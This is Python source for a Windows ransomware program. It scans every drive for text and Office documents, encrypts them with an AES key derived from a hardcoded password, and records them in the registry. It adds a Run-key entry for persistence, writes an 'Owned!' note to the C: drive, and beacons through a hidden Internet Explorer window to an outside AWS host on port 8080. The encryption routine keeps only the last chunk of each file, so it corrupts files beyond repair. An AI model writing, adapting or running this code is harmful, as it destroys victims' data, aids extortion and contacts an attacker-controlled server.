import os
import hashlib
import random
import struct
import win32com.client
import time
import sys
import win32api
from _winreg import *

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Cipher import AES

def GenerateCert():

	new_key = RSA.generate(2048, e=65537)
	
	public_key = new_key.publickey().exportKey('PEM')
	private_key = new_key.exportKey('PEM')
	
	keys = (public_key, private_key)
	
	return keys
	
	
def GenerateAESKey(password):

	aes_key	= hashlib.sha256(password).digest()
	
	return aes_key
	
	
def FindDocuments(drive):
	'''Returns a generator of files with the target extensions'''
	documents = [os.path.normpath(os.path.join(parent, filename)) 
				for parent, directories, filenames in os.walk(drive) 
				for filename in filenames 
				if os.path.splitext(filename)[1] in target_extensions]
												
	return documents
	
	
def EncryptDocument(document_path):
	'''This section was modified from eli.thegreenplace.net/2010/06/25/aes-encryption-of-files-in-python-with-pycrypto'''
	keyVal = r'SOFTWARE\Ransomware\Files'
	
	try:
		key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
	
		value, regtype = QueryValueEx(key, os.path.basename(document_path))
	
		CloseKey(key)
		if value is not None:
			return
	except:
		pass
			
	try:
		chunk_size = 64 * 1024
		IV = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
		file_size = os.path.getsize(document_path)
		mode = AES.MODE_CBC
		encryptor = AES.new(aes_key, mode, IV=IV)
		
		plain_text = ''
		cipher_text = ''
		
		with open(document_path, 'rb') as doc:
			while True:
				chunk = doc.read(chunk_size)
				if len(chunk) == 0:
					break
				elif len(chunk) % 16 != 0:
					chunk += ' ' * (16 - len(chunk) % 16)
				
				cipher_text = encryptor.encrypt(chunk)
				
			with open(document_path, 'wb') as doc:
				doc.write(struct.pack('<Q', file_size))
				doc.write(IV)
				doc.write(cipher_text)
	except:
		pass

def DecryptDocument(document_path):
	
	chunk_size = 16 * 1024
	
	plain_text = ''
	cipher_text = ''
	
	with open(document_path, 'rb') as doc:
		orig_size = struct.unpack('<Q', doc.read(struct.calcsize('Q')))[0]
		IV = doc.read(16)
		decryptor = AES.new(aes_key, AES.MODE_CBC, IV)
		
		while True:
			chunk = doc.read(chunk_size)
			if len(chunk) == 0:
				break
			plain_text = decryptor.decrypt(chunk)
				
	with open(document_path, 'wb') as doc:
		doc.write(plain_text)
		doc.truncate(orig_size)
		
		
def PhoneHome():

	def wait_for_browser(browser):
		while browser.ReadyState != 4 and browser.ReadyState != 'complete':
			time.sleep(0.1)
		return
	
	while True:
		ie = win32com.client.Dispatch('InternetExplorer.Application')
		ie.Visible = 0
		ie.Navigate('http://ec2-54-165-16-219.compute-1.amazonaws.com:8080')
		wait_for_browser(ie)
		
		time.sleep(60)
		ie.Quit()
		ie = None
	return
	
	
def ObtainPersistence():

	keyVal = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
	
	try:
		key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
	except:
		key = CreateKey(HKEY_CURRENT_USER, keyVal)
		
	SetValueEx(key, 'Ransomware-Autorun', 0, REG_SZ, os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'ransomware.exe'))
	
	CloseKey(key)
		

def RecordEncryptedDocs(docs):

	keyVal = r'SOFTWARE\Ransomware\Files'
	
	try:
		key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
	except:
		key = CreateKey(HKEY_CURRENT_USER, keyVal)
		
	for doc in docs:
		SetValueEx(key, os.path.basename(doc), 0, REG_SZ, os.path.abspath(doc))
	
	CloseKey(key)

	
def GetDriveLetters():

	api_call = win32api.GetLogicalDriveStrings()
	drives = api_call.split('\000')[:-1]
	
	if 'A:\\' in drives:
		drives.remove('A:\\')
		
	return drives
	
	
if __name__ == '__main__':

	target_extensions = ['.txt', '.docx', '.doc', '.xls', '.xlsx', '.ppt', '.pptx']
	
	aes_key = GenerateAESKey('kitty')

	drives = GetDriveLetters()
	
	for drive in drives:
		docs = FindDocuments(drive)
		RecordEncryptedDocs(docs)
		for doc in docs:
			EncryptDocument(doc)
			
	ObtainPersistence()
	
	with open('C:\\DecryptInstructions.txt', 'w+') as DecryptInstructions:
		DecryptInstructions.write('Owned!')
	
	PhoneHome()